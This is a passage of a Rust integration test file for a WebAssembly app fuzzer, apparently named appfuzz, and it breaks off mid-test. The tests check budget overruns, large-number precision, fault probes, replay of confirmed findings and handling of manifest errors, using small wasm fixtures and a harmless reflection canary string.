fn exact_request_guarantees_distinguish_adjacent_large_integer_inputs() {
    let f = Fixture::new(false);
    std::fs::write(
        f.dir.join("app.wasm"),
        component(
            "package test:workflow; world app {export run:func(n:u64)->u32;}",
            r#"(module (func (export "run") (param i64) (result i32) (unreachable)))"#,
        ),
    )
    .unwrap();
    f.edit("\nrequest = 1\n", "\nrequest = 9007199254740992\nvalues={''='range:9007199254740993..9007199254740993'}\n");
    let (code, outside) = f.cli(&["run"]);
    assert_eq!(code, 0, "{outside}");
    assert!(outside["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "crash" && f["severity"] == "info"), "{outside}");
    let (code, allowed) = f.cli(&["run", "--request", "9007199254740993"]);
    assert_eq!(code, 0, "{allowed}");
    assert!(allowed["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "crash" && f["severity"] == "fail"), "{allowed}");
}

#[test]
fn numeric_properties_keep_exact_thresholds_and_acceptance_cases_replay() {
    for (value, upper) in [("9007199254740993", "9007199254740992"), ("0.10000000000000000001", "0.1")] {
        let f = Fixture::new(true);
        f.edit("request = \"safe\"", &format!("request = \"{value}\""));
        let (code, checked) = f.cli(&["check", "value_range", "$", "0", upper, "--runs", "1", "--time", "1s", "--max-runs", "10"]);
        assert_eq!(code, 2, "{checked}");
        let mut manifest = std::fs::read_to_string(&f.manifest).unwrap();
        manifest.push_str(&format!(
            "\n[acceptance]\nversion=1\n[acceptance.checks.precise]\norigin='app'\nsearch=false\nproperty=['value_range','$','0','{upper}']\n"
        ));
        std::fs::write(&f.manifest, manifest).unwrap();
        let (code, acceptance) = f.cli(&["acceptance", "run"]);
        assert_eq!(code, 2, "{acceptance}");
        let case = acceptance["checks"][0]["case"].as_str().unwrap();
        let (code, replayed) = f.cli(&["replay", case]);
        assert_eq!(code, 0, "{replayed}");
        assert_eq!(replayed["reproduced"], true);
    }
    let f = Fixture::new(false);
    let (code, checked) = f.cli(&[
        "check",
        "max",
        "cost",
        "18446744073709551614",
        "--plan",
        r#"{"test:workflow/db#get":{"return":1,"cost":18446744073709551615}}"#,
        "--runs",
        "1",
        "--time",
        "1s",
        "--max-runs",
        "10",
    ]);
    assert_eq!(code, 2, "{checked}");
    assert_eq!(checked["counterexample"]["detail"]["value"], u64::MAX);
    assert_eq!(checked["counterexample"]["detail"]["max"], u64::MAX - 1);
}

#[test]
fn metric_checks_include_charges_before_a_host_trap() {
    let f = Fixture::new(false);
    let (code, checked) = f.cli(&[
        "check",
        "max",
        "cost",
        "0",
        "--plan",
        r#"{"test:workflow/db#get":{"trap":"service down","cost":1}}"#,
        "--runs",
        "1",
        "--time",
        "1s",
        "--max-runs",
        "10",
    ]);
    assert_eq!(code, 2, "{checked}");
    assert_eq!(checked["counterexample"]["detail"]["value"], 1);
}

#[test]
fn invalid_times_and_timing_settings_cannot_pass_a_review() {
    let f = Fixture::new(false);
    for time in ["2026-02-29", "2026-11-02T10:xx:00", "9223372036854775807-01-01"] {
        let (code, review) = f.cli(&["review", "--runs", "1", "--time", "0s", "--now", time]);
        assert_eq!(code, 3, "{time}: {review}");
        assert_ne!(review["verdict"], "pass");
    }
    f.edit("max_latency_ms = 200", "max_latency_ms = nan");
    let (code, result) = f.cli(&["run"]);
    assert_eq!(code, 3, "{result}");
    assert!(result["error"].as_str().unwrap().contains("finite"));
}

#[test]
fn huge_host_budgets_are_reported_without_crashing_the_cli() {
    let f = Fixture::new(false);
    let bytes = component(
        "package test:workflow; interface db {get:func(id:u32)->u32;} world app {import db;export run:func(n:u32)->u32;}",
        r#"(module (import "test:workflow/db" "get" (func $get (param i32) (result i32)))
          (func (export "run") (param i32) (result i32)
            (drop (call $get (local.get 0))) (call $get (local.get 0))))"#,
    );
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    let (code, run) = f.cli(&["run", "--plan", r#"{"test:workflow/db#get":{"return":1,"cost":18446744073709551615,"latency_ms":1e30}}"#]);
    assert_eq!(code, 0, "{run}");
    assert_eq!(run["totals"]["cost"], (2 * u128::from(u64::MAX)).to_string());
    let (_, raw) = f.cli(&["show", "last"]);
    let host_ns: appfuzz_core::natural::Natural = serde_json::from_value(raw["totals"]["host_ns"].clone()).unwrap();
    assert_eq!(host_ns, appfuzz_core::natural::Natural::from_scaled_f64(1e30, 1_000_000) * 2);
    let virtual_ns: appfuzz_core::natural::Natural = serde_json::from_value(raw["totals"]["virtual_ns"].clone()).unwrap();
    assert!(virtual_ns >= host_ns);
    let (code, calls) = f.cli(&["show", "last", "--view", "calls"]);
    assert_eq!(code, 0, "{calls}");
    assert_eq!(calls["functions"]["test:workflow/db#get"]["cost"], (2 * u128::from(u64::MAX)).to_string());
    assert_eq!(calls["functions"]["test:workflow/db#get"]["latency_ms"], appfuzz_core::natural::Natural::from_scaled_f64(2e30, 1_000_000).ms_json());
    let (code, explained) = f.cli(&["show", "last", "--view", "explanation"]);
    assert_eq!(code, 0, "{explained}");
    let high = run["run"].as_str().unwrap();
    let (_, low_run) = f.cli(&["run", "--plan", r#"{"test:workflow/db#get":{"return":1,"cost":1}}"#]);
    let low = low_run["run"].as_str().unwrap();
    let (code, difference) = f.cli(&["diff", high, low]);
    assert_eq!(code, 0, "{difference}");
    assert_eq!(difference["totals"]["cost"]["a"], (2 * u128::from(u64::MAX)).to_string());
    assert_eq!(difference["totals"]["cost"]["b"], 2);
    assert_eq!(difference["totals"]["cost"]["delta"], format!("-{}", 2 * u128::from(u64::MAX) - 2));
}

#[test]
fn cost_overruns_above_u64_confirm_replay_and_regress() {
    let f = Fixture::new(false);
    let manifest = std::fs::read_to_string(&f.manifest).unwrap().replace("cost_per_request = 100", &format!("cost_per_request = {}", i64::MAX));
    std::fs::write(&f.manifest, manifest).unwrap();
    let wit = "package test:workflow; interface db {get:func(id:u32)->u32;} world app {import db;export run:func(n:u32)->u32;}";
    std::fs::write(
        f.dir.join("app.wasm"),
        component(
            wit,
            r#"(module (import "test:workflow/db" "get" (func $get (param i32) (result i32)))
            (func (export "run") (param i32) (result i32) (drop (call $get (local.get 0))) (call $get (local.get 0))))"#,
        ),
    )
    .unwrap();
    let plan = r#"{"test:workflow/db#get":{"return":1,"cost":18446744073709551615,"latency_ms":0}}"#;
    let (code, run) = f.cli(&["run", "--plan", plan]);
    assert_eq!(code, 0, "{run}");
    let finding = run["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "over_budget").unwrap_or_else(|| panic!("{run}"));
    let overrun = run["over_limits"].as_array().unwrap().iter().find(|v| v["limit"] == "cost_per_request").unwrap();
    assert_eq!(overrun["used"], (2 * u128::from(u64::MAX)).to_string());
    let (_, checked) = f.cli(&["check", "max", "cost", &u64::MAX.to_string(), "--runs", "1", "--time", "1ms", "--max-runs", "10"]);
    assert_eq!(checked["holds"], false, "{checked}");
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    std::fs::write(
        f.dir.join("app.wasm"),
        component(
            wit,
            r#"(module (import "test:workflow/db" "get" (func $get (param i32) (result i32)))
            (func (export "run") (param i32) (result i32) (local.get 0)))"#,
        ),
    )
    .unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
}

#[test]
fn huge_latency_budgets_confirm_replay_diff_and_regress() {
    let f = Fixture::new(false);
    f.edit("max_latency_ms = 200", "max_latency_ms = 1e20");
    let plan = r#"{"test:workflow/db#get":{"return":1,"latency_ms":1e200}}"#;
    let (code, run) = f.cli(&["run", "--plan", plan]);
    assert_eq!(code, 0, "{run}");
    let finding = run["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "over_budget").unwrap();
    assert!(run["totals"]["host_ns"].is_string());
    let (_, checked) = f.cli(&["check", "max", "virtual_ms", "1e20", "--runs", "1", "--time", "1ms", "--max-runs", "10"]);
    assert_eq!(checked["holds"], false, "{checked}");
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    let (_, low) = f.cli(&["run", "--plan", r#"{"test:workflow/db#get":{"return":1,"latency_ms":0}}"#]);
    let (code, difference) = f.cli(&["diff", run["run"].as_str().unwrap(), low["run"].as_str().unwrap()]);
    assert_eq!(code, 0, "{difference}");
    assert_eq!(difference["totals"]["virtual_ms"]["delta"], json!(-1e200));
    let (code, again) = f.cli(&["run", "--plan", plan]);
    assert_eq!(code, 0, "{again}");
    assert_eq!(again["run"], run["run"]);
    let bytes = component(
        "package test:workflow; interface db { get: func(id: u32) -> u32; } world app {import db; export run:func(n:u32)->u32;}",
        r#"(module (import "test:workflow/db" "get" (func (param i32) (result i32))) (func (export "run") (param i32) (result i32) (i32.const 1)))"#,
    );
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
}

#[test]
fn invalid_platform_value_bounds_are_reported_as_configuration_errors() {
    for constraint in ["range:10..1", "range:NaN..1", "range:1..inf", "len:10..1"] {
        let f = Fixture::new(false);
        f.edit("\nrequest = 1\n", &format!("\nrequest = 1\nvalues = {{ '' = '{constraint}' }}\n"));
        let (code, result) = f.cli(&["run"]);
        assert_eq!(code, 3, "{constraint}: {result}");
        let error = result["error"].as_str().unwrap();
        assert!(error.contains("lower") || error.contains("finite"), "{result}");
    }
}

#[test]
fn guest_input_domains_do_not_filter_out_invalid_requests() {
    let f = Fixture::new(true);
    f.edit("request = \"safe\"", "request = \"0.0.0000\"\ninput_values={''=['required','format:date']}");
    let mut text = std::fs::read_to_string(&f.manifest).unwrap();
    text.push_str(
        "\n[acceptance]\nversion=1\n[acceptance.checks.reject]\norigin='app'\nsearch=false\ninput_class='invalid'\nexpect={selector='$',equals='rejected'}\n",
    );
    std::fs::write(&f.manifest, text).unwrap();
    let (code, r) = f.cli(&["acceptance", "run"]);
    assert_eq!(code, 2, "{r}");
    assert_eq!(r["checks"][0]["status"], "broken");
    let case = r["checks"][0]["case"].as_str().unwrap();
    assert_eq!(f.cli(&["replay", case]).0, 0);
    f.edit("input_class='invalid'", "input_class='valid'");
    let (code, r) = f.cli(&["acceptance", "run"]);
    assert_eq!(code, 3, "{r}");
    assert_eq!(r["checks"][0]["matches"], 0);
    f.edit("input_class='valid'", "input_class='invalid'");
    f.edit("input_values=", "values={''='format:date'}\ninput_values=");
    let (code, r) = f.cli(&["acceptance", "run"]);
    assert_eq!(code, 3, "{r}");
    assert_eq!(r["checks"][0]["status"], "not_exercised");
}

#[test]
fn rejected_input_must_obey_declared_effect_restrictions() {
    let f = Fixture::new(false);
    f.edit("\nrequest = 1\n", "\nrequest = 7\ninput_values={''='range:1..6'}\n");
    let mut text = std::fs::read_to_string(&f.manifest).unwrap();
    text.push_str("\n[functions.\"test:workflow/db#get\"]\neffect='write'\n[acceptance]\nversion=1\n[acceptance.checks.reject]\norigin='app'\nsearch=false\ninput_class='invalid'\nproperty=['no_crash']\nforbid_effects=['write','delete','external']\n");
    std::fs::write(&f.manifest, text).unwrap();
    let (code, r) = f.cli(&["acceptance", "run"]);
    assert_eq!(code, 2, "{r}");
    assert!(r["checks"][0]["evidence"]["why"].as_str().unwrap().contains("forbidden effect"));
    let case = r["checks"][0]["case"].as_str().unwrap();
    f.edit("effect='write'\n", "");
    let (code, unknown) = f.cli(&["acceptance", "run"]);
    assert_eq!(code, 3, "{unknown}");
    f.edit("[functions.\"test:workflow/db#get\"]\n", "[functions.\"test:workflow/db#get\"]\neffect='write'\n");
    let bytes = component(
        "package test:workflow; world app {export run:func(n:u32)->u32;}",
        r#"(module (func (export "run") (param i32) (result i32) (i32.const 7)))"#,
    );
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    let (code, r) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{r}");
    assert_eq!(r["reproduced"], false);
}

fn fault_fixture(crash: bool) -> Fixture {
    let f = Fixture::new(false);
    let wit = "package test:workflow; interface db { save:func(id:u32) -> result<u32,u32>; } world app { import db; export run:func(n:u32) -> u32; }";
    let guard = if crash { "(if (i32.and (i32.load (i32.const 0)) (i32.eq (local.get $i) (i32.const 7))) (then unreachable))" } else { "" };
    let wat = format!(
        r#"(module (import "test:workflow/db" "save" (func $save (param i32 i32)))
      (memory (export "memory") 1)
      (func (export "run") (param i32) (result i32) (local $i i32)
        (local.set $i (i32.const 1)) (loop $next
          (call $save (local.get $i) (i32.const 0)) {guard}
          (local.set $i (i32.add (local.get $i) (i32.const 1)))
          (br_if $next (i32.le_u (local.get $i) (i32.const 7))))
        (i32.const 42)))"#
    );
    std::fs::write(f.dir.join("app.wasm"), component(wit, &wat)).unwrap();
    f
}

/// An app that calls `db#get` x × y times (each at most 16).
fn nested_fixture() -> Fixture {
    let f = Fixture::new(false);
    let wit = "package test:workflow; interface db { get: func(id: u32) -> u32; } world app { import db; record req { x: u32, y: u32 } export run: func(r: req) -> u32; }";
    let wat = r#"(module (import "test:workflow/db" "get" (func $get (param i32) (result i32)))
      (memory (export "memory") 1)
      (func (export "run") (param $x i32) (param $y i32) (result i32) (local $i i32) (local $n i32)
        (if (i32.gt_u (local.get $x) (i32.const 16)) (then (local.set $x (i32.const 16))))
        (if (i32.gt_u (local.get $y) (i32.const 16)) (then (local.set $y (i32.const 16))))
        (local.set $n (i32.mul (local.get $x) (local.get $y)))
        (block $done (loop $next
          (br_if $done (i32.ge_u (local.get $i) (local.get $n)))
          (drop (call $get (local.get $i)))
          (local.set $i (i32.add (local.get $i) (i32.const 1)))
          (br $next)))
        (i32.const 0)))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    f.edit("\nrequest = 1\n", "\nrequest = { x = 1, y = 1 }\n");
    f
}

#[test]
fn nested_fan_out_is_confirmed_by_scaling_both_fields() {
    let f = nested_fixture();
    let (_, amplify) = f.cli(&["amplify"]);
    let (_, found) = f.cli(&["findings"]);
    let nested =
        found["findings"].as_array().unwrap_or_else(|| panic!("{found}")).iter().find(|x| x["kind"] == "nested_fan_out").unwrap_or_else(|| panic!("{amplify}"));
    let (code, confirmed) = f.cli(&["confirm", nested["id"].as_str().unwrap()]);
    assert_eq!(code, 0, "{confirmed}");
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    // The case replays: comparing runs from it shows the finding again.
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true, "{replayed}");
    assert_legacy_finding_case_replays(&f, case, false);
}

#[test]
fn fault_probe_budgets_filter_and_replay_late_crashes_and_ignored_errors() {
    let plan = r#"{"test:workflow/db#save":{"return":{"ok":1}}}"#;
    let f = fault_fixture(true);
    let (code, p) = f.cli(&["probe", "faults", "--plan", plan, "--runs", "3"]);
    assert_eq!(code, 3, "{p}");
    assert_eq!(p["attempted"], 3);
    assert_eq!(p["complete"], false);
    let (code, p) = f.cli(&["probe", "faults", "--plan", plan, "--fn", "missing"]);
    assert_eq!(code, 3, "{p}");
    assert_eq!(p["attempted"], 0);
    let (code, p) = f.cli(&["probe", "faults", "--plan", plan, "--runs", "14"]);
    assert_eq!(code, 0, "{p}");
    assert_eq!(p["complete"], true);
    assert_eq!(p["injected"], 14);
    let crash = p["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "crash").unwrap();
    let (_, confirmed) = f.cli(&["confirm", crash["id"].as_str().unwrap()]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replay) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replay}");
    assert_eq!(replay["reproduced"], true);

    let f = fault_fixture(false);
    let (_, p) = f.cli(&["probe", "faults", "--plan", plan, "--runs", "14"]);
    let ignored = p["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "error_ignored").unwrap();
    let (_, confirmed) = f.cli(&["confirm", ignored["id"].as_str().unwrap()]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let saved: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    assert!(!saved["recipe"]["fault"]["fault"].is_null(), "{saved}");
    let (code, replay) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replay}");
    assert_eq!(replay["reproduced"], true);
    let (_, r) = f.cli(&["fuzz", "--plan", plan, "--fresh", "--runs", "160"]);
    assert!(r["faults"]["attempted"].as_u64().unwrap() > 0, "{r}");
    assert!(r["runs"].as_u64().unwrap() <= 160);
}

#[test]
fn repeat_reviews_preserve_confirmed_failures_even_when_fresh() {
    let f = Fixture::new(true);
    for args in [vec!["review", "--runs", "40"], vec!["review", "--runs", "40"], vec!["review", "--runs", "40", "--fresh"]] {
        let (code, v) = f.cli(&args);
        assert_eq!(code, 2, "{v}");
        assert_eq!(v["status"], "complete", "{v}");
        assert!(v["findings"].as_array().unwrap().iter().any(|v| v["kind"] == "reflection"), "{v}");
    }
}

#[test]
fn findings_are_listed_for_apps_with_built_in_labels() {
    // An import appfuzz has built-in labels for (wasi:keyvalue, Spin, an
    // HTTP handler) adds them to the manifest when the app loads; the
    // commands that read stored findings must look in the same place.
    let f = Fixture::new(true);
    let bytes = component(
        "package test:workflow; package wasi:keyvalue { interface atomics { increment: func(key: string, delta: u64) -> u64; } } world app { import wasi:keyvalue/atomics; export run: func(input: string) -> string; }",
        r#"
            (module
              (import "wasi:keyvalue/atomics" "increment" (func (param i32 i32 i64) (result i64)))
              (memory (export "memory") 4)
              (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32) (i32.const 1024))
              (func (export "run") (param i32 i32) (result i32)
                (i32.store (i32.const 0) (local.get 0))
                (i32.store (i32.const 4) (local.get 1))
                (i32.const 0)))"#,
    );
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    let (code, review) = f.cli(&["review", "--runs", "40"]);
    assert_eq!(code, 2, "{review}");
    let reflection = review["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "reflection").unwrap_or_else(|| panic!("{review}"))["id"].clone();
    let (_, listed) = f.cli(&["findings", "--min", "info"]);
    assert!(listed["findings"].as_array().unwrap().iter().any(|v| v["id"] == reflection), "{listed}");
}

#[test]
fn crashes_are_named_by_their_cause() {
    let f = Fixture::new(false);
    let wat = r#"(module (memory (export "memory") 1) (func (export "run") (param i32) (result i32) unreachable))"#;
    std::fs::write(f.dir.join("app.wasm"), component("package test:workflow; world app { export run: func(n: u32) -> u32; }", wat)).unwrap();
    let (_, run) = f.cli(&["run"]);
    let crash = run["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "crash").unwrap_or_else(|| panic!("{run}"));
    assert!(crash["title"].as_str().unwrap().ends_with("crashes: wasm trap: wasm `unreachable` instruction executed"), "{crash}");
    let (_, explained) = f.cli(&["explain", "last"]);
    assert_eq!(explained["message"], "wasm trap: wasm `unreachable` instruction executed", "{explained}");
}

#[test]
fn confirmed_findings_point_at_the_minimised_run() {
    let f = Fixture::new(true);
    let long = format!(r#"["{} cnry1a2b7<i>'\" {} cnry3c4d9<i>'\""]"#, "a".repeat(200), "b".repeat(200));
    let (_, run) = f.cli(&["run", "--args", &long]);
    let found = run["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "reflection").unwrap_or_else(|| panic!("{run}")).clone();
    let (_, confirmed) = f.cli(&["confirm", found["id"].as_str().unwrap()]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let min = confirmed["minimised_run"].as_str().unwrap();
    assert_ne!(min, run["run"].as_str().unwrap());
    assert_eq!(confirmed["finding"]["run"], min, "{confirmed}");
    // The text lost a canary it didn't need, not just its end.
    let arg = confirmed["spec"]["args"][0].as_str().unwrap();
    assert_eq!(arg.matches("cnry").count(), 1, "{arg}");
    assert!(arg.len() < 60, "{arg}");
    let (_, listed) = f.cli(&["findings"]);
    let listed = listed["findings"].as_array().unwrap().iter().find(|v| v["id"] == found["id"]).unwrap().clone();
    assert_eq!(listed["run"], min, "{listed}");
    assert!(listed["case"].is_string());
}

#[test]
fn probes_that_do_not_apply_say_so() {
    let f = Fixture::new(true);
    for probe in ["web", "auth"] {
        let (code, out) = f.cli(&["probe", probe]);
        assert_eq!(code, 0, "{out}");
        assert_eq!(out["probes"], 0);
        assert!(out["note"].as_str().unwrap().starts_with("doesn't apply: run takes no HTTP request"), "{out}");
    }
    let (code, out) = f.cli(&["probe", "values"]);
    assert_eq!(code, 0, "{out}");
    assert!(out["note"].as_str().unwrap().starts_with("doesn't apply"), "{out}");
    let (_, review) = f.review();
    let web = review["steps"].as_array().unwrap().iter().find(|s| s["step"] == "probe web").unwrap().clone();
    assert!(web["note"].is_string(), "{web}");
    // A function the app doesn't call: nothing was checked.
    let f = Fixture::new(false);
    let (code, out) = f.cli(&["probe", "values", "--fn", "missing"]);
    assert_eq!(code, 3, "{out}");
    assert_eq!(out["note"], "no host function the app imports matches --fn missing");
    let (code, out) = f.cli(&["probe", "values", "--fn", "get"]);
    assert_eq!(code, 0, "{out}");
    assert!(out["note"].is_null(), "{out}");
}

#[test]
fn an_ignored_spin_toml_is_named() {
    let f = Fixture::new(false);
    std::fs::write(f.dir.join("spin.toml"), "spin_manifest_version = 2\n").unwrap();
    let here = |args: &[&str]| -> Value {
        let out = Command::new(env!("CARGO_BIN_EXE_appfuzz")).current_dir(&f.dir).args(args).output().unwrap();
        serde_json::from_slice(&out.stdout).unwrap()
    };
    let out = here(&["inspect"]);
    assert!(out["warnings"][0].as_str().unwrap().starts_with("spin.toml is ignored because appfuzz.toml is here"), "{out}");
    let status = here(&[]);
    assert_eq!(status["state"]["manifest"], "appfuzz.toml", "{status}");
    // Picked on purpose: no warning.
    assert!(here(&["--manifest", "appfuzz.toml", "inspect"])["warnings"].is_null());
    std::fs::remove_file(f.dir.join("spin.toml")).unwrap();
    assert!(here(&["inspect"])["warnings"].is_null());
}

#[test]
fn an_unreadable_run_file_is_left_out_with_a_warning() {
    let f = Fixture::new(false);
    let (_, run) = f.cli(&["run"]);
    std::fs::write(f.dir.join("state/runs/0000broken.json"), b"{\"id\": \"0000broken\"}").unwrap();
    let (code, status) = f.cli(&[]);
    assert_eq!(code, 0, "{status}");
    assert_eq!(status["state"]["runs"], 1, "{status}");
    let w = status["warnings"][0].as_str().unwrap();
    assert!(w.starts_with("1 stored run can't be read and was left out: ") && w.contains("0000broken.json"), "{w}");
    let (code, shown) = f.cli(&["explain", "last"]);
    assert_eq!(code, 0, "{shown}");
    assert_eq!(shown["run"], run["run"]);
    let (code, unexplored) = f.cli(&["unexplored"]);
    assert_eq!(code, 0, "{unexplored}");
    assert!(unexplored["warnings"][0].as_str().unwrap().contains("0000broken.json"), "{unexplored}");
    // Asked for by name, the file is an error.
    let (code, err) = f.cli(&["explain", "0000broken"]);
    assert_eq!(code, 3, "{err}");
}

#[test]
fn last_is_the_run_just_shown() {
    // A run already in the store is not run again, but it is the latest.
    let f = Fixture::new(false);
    let (_, first) = f.cli(&["run"]);
    let (_, other) = f.cli(&["run", "--args", "[2]"]);
    assert_ne!(first["run"], other["run"]);
    let (_, again) = f.cli(&["run"]);
    assert_eq!(again["run"], first["run"]);
    let (_, shown) = f.cli(&["explain", "last"]);
    assert_eq!(shown["run"], first["run"], "{shown}");
}

#[test]
fn nonexecuting_reviews_are_incomplete() {
    let f = Fixture::new(false);
    f.edit("export = \"run\"", "export = \"missing\"");
    let (code, v) = f.review();
    assert_eq!(code, 3, "{v}");
    assert_eq!(v["verdict"], "incomplete");
    f.edit("export = \"missing\"", "export = \"run\"");
    f.edit("\nrequest = 1\n", "\nrequest = \"wrong type\"\n");
    let (code, v) = f.review();
    assert_eq!(code, 3, "{v}");
    assert_eq!(v["verdict"], "incomplete");
    assert!(v["errors"].as_array().unwrap().iter().any(|error| error.to_string().contains("argument")), "{v}");
}

#[test]
fn contract_changes_invalidate_cached_execution_and_findings() {
    let f = Fixture::new(false);
    let (_, before) = f.cli(&["run"]);
    let mut m = std::fs::read_to_string(&f.manifest).unwrap();
    m.push_str("\n[functions.\"test:workflow/db#get\"]\ncost = 500\nlatency_ms = 1000\n");
    std::fs::write(&f.manifest, m).unwrap();
    let (_, after) = f.cli(&["run"]);
    assert_ne!(before["run"], after["run"]);
    assert_eq!(after["totals"]["cost"], 500);
    assert_eq!(after["totals"]["host_ms"], 1000.0);
    assert!(after["findings"].as_array().unwrap().iter().any(|x| x["kind"] == "over_budget"));
    f.edit("cost = 500", "cost = 1");
    f.edit("latency_ms = 1000", "latency_ms = 1");
    let (_, findings) = f.cli(&["findings"]);
    assert_eq!(findings["count"], 0, "{findings}");
}

#[test]
fn plans_and_large_records_round_trip_losslessly() {
    let f = Fixture::new(false);
    let (code, plan) = f.cli(&["plan", "template"]);
    assert_eq!(code, 0);
    assert!(plan.get("next").is_none());
    assert_eq!(f.cli(&["run", "--plan", &plan.to_string()]).0, 0);
    let echo = Fixture::new(true);
    let input = "a".repeat(1200);
    let (code, v) = echo.cli(&["run", "--request", &json!(input).to_string(), "--trace"]);
    assert_eq!(code, 0, "{v}");
    assert_eq!(v["result"], input);
    let (_, record) = echo.cli(&["show", "last"]);
    assert_eq!(record["result"], input);
    assert!(record.get("next").is_none());
    let (_, body) = echo.cli(&["show", "last", "--field", "result"]);
    assert_eq!(body, input);
}

#[test]
fn failed_and_unexercised_properties_do_not_exit_successfully() {
    let f = Fixture::new(false);
    let (code, v) = f.cli(&["check", "max_calls", "db#get", "0", "--runs", "10"]);
    assert_eq!(code, 2, "{v}");
    assert_eq!(v["holds"], false);
    let (code, v) = f.cli(&["check", "value_range", ".missing", "0", "100", "--runs", "10"]);
    assert_eq!(code, 3, "{v}");
    assert_eq!(v["status"], "not_exercised");
    assert!(v["holds"].is_null());
    let (code, v) = f.cli(&["check", "value_range", "$", "0", "4294967295", "--runs", "10"]);
    assert_eq!(code, 0, "{v}");
    assert!(v["matches"].as_u64().unwrap() > 0);
}

#[test]
fn forbidden_text_in_guest_logs_cannot_pass_a_stored_run_check() {
    for fd in [1, 2] {
        let f = Fixture::new(false);
        std::fs::write(f.dir.join("plugin.wit"), "package test:logs; world plugin { export run:func()->string; }").unwrap();
        std::fs::write(f.dir.join("platform.toml"), "[platform]\nname='logs'\nabi='extism'\nwit='plugin.wit'\n").unwrap();
        std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='platform.toml'\n[entry]\nexport='run'\n").unwrap();
        let bytes = wat::parse_str(format!(
            r#"(module
            (import "wasi_snapshot_preview1" "fd_write" (func $write (param i32 i32 i32 i32) (result i32)))
            (memory (export "memory") 1) (data (i32.const 64) "panicked")
            (func (export "run") (result i32)
                (i32.store (i32.const 0) (i32.const 64)) (i32.store (i32.const 4) (i32.const 8))
                (drop (call $write (i32.const {fd}) (i32.const 0) (i32.const 1) (i32.const 16))) (i32.const 0)))"#
        ))
        .unwrap();
        std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
        assert_eq!(f.cli(&["run"]).0, 0);
        let (_, stored) = f.cli(&["show", "last"]);
        assert_eq!(stored[if fd == 1 { "stdout" } else { "stderr" }], "panicked");
        let (code, checked) = f.cli(&["check", "not_contains", "panicked", "--runs", "1", "--time", "1ms", "--max-runs", "10"]);
        assert_eq!(code, 2, "{checked}");
        assert_eq!(checked["holds"], false);
    }
}

#[test]
fn replay_distinguishes_exact_builds_from_regression_checks() {
    let f = Fixture::new(true);
    let (_, review) = f.review();
    let case = review["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "reflection").unwrap()["case"].as_str().unwrap();
    assert_eq!(f.cli(&["replay", case]).0, 0);
    let wasm = f.dir.join("app.wasm");
    let mut bytes = std::fs::read(&wasm).unwrap();
    bytes.extend_from_slice(b"\0\x06\x05audit");
    std::fs::write(&wasm, bytes).unwrap();
    assert_eq!(f.cli(&["replay", case]).0, 3);
    let (code, v) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 2, "{v}");
    assert_eq!(v["reproduced"], true);
    let mut edited: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    edited["per_run"] = json!(false);
    edited["recipe"] = Value::Null;
    let path = f.dir.join("unsupported.json");
    std::fs::write(&path, edited.to_string()).unwrap();
    assert_eq!(f.cli(&["replay", path.to_str().unwrap(), "--against-current"]).0, 3);
}

#[test]
fn envelope_requires_accepted_review_and_ignores_later_exploration() {
    let f = Fixture::new(false);
    let path = f.dir.join("envelope.json");
    let path = path.to_str().unwrap();
    f.cli(&["run"]);
    assert_eq!(f.cli(&["envelope", "--out", path]).0, 3);
    let (code, v) = f.review();
    assert_eq!(code, 0, "{v}");
    let id = v["session"].as_str().unwrap();
    assert_eq!(f.cli(&["envelope", "--review", id, "--out", path]).0, 0);
    let before = std::fs::read(path).unwrap();
    let (_, bad) = f.cli(&["run", "--plan", "{\"test:workflow/db#get\":{\"cost\":999}}"]);
    assert_eq!(bad["totals"]["cost"], 999);
    assert_eq!(f.cli(&["envelope", "--review", id, "--out", path]).0, 0);
    assert_eq!(before, std::fs::read(path).unwrap());
    assert_eq!(f.cli(&["envelope", "check", "{}", "--envelope", path]).0, 3);
    f.cli(&["run"]);
